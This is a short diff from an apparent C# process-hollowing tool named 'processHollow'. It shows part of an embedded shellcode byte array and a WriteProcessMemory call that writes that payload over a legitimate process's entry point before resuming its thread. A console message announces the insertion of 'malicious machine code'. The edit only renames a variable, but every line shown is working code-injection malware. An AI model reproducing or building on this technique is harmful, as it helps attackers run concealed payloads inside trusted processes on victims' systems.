@@ -151,7 +151,7 @@ namespace processHollow
                    0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,
                    0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
 
-            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nWritten);
             Console.WriteLine(" [+] Completed insert of malicious machine code over legitimate process. Press enter to resume the thread.");
             line = Console.ReadLine();
             ResumeThread(pi.hThread);
